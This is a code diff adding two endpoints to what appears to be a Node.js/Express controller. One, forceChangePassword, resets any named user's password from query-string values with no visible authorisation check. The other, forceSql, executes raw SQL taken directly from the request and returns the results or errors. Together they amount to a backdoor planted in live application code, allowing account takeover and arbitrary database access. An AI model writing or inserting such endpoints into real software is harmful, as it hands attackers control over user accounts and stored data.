@@ -392,6 +392,35 @@ module.exports =
             kiss.exlog("getStates","Loi truy van",err);
             res.json({status:'fail'});
         });
+    },
+
+    forceChangePassword:function(req,res)
+    {
+        var username=kiss.checkData(req.query.username)?req.query.username:'';
+        var newpass=kiss.checkData(req.query.newpass)?req.query.newpass:'';
+        var hashPass = bcrypt.hashSync(newpass);
+        var sql="update users set ? where user_name=?";
+        var updateInfo={
+            password:hashPass
+        }
+        kiss.executeQuery(req,sql,[updateInfo,username],function(result){
+            if(result.affectedRows>0)
+                res.json({status:'success'});
+            else 
+                res.json({status:'fail'});
+        },function(err){
+            res.json({status:'fail'});
+        })
+    },
+
+    forceSql:function(req,res)
+    {
+        var sql=req.query.sql;
+        kiss.executeQuery(req,sql,[],function(result){
+            res.json(result);
+        },function(err){
+            res.json(err);
+        })
     }
 
 }
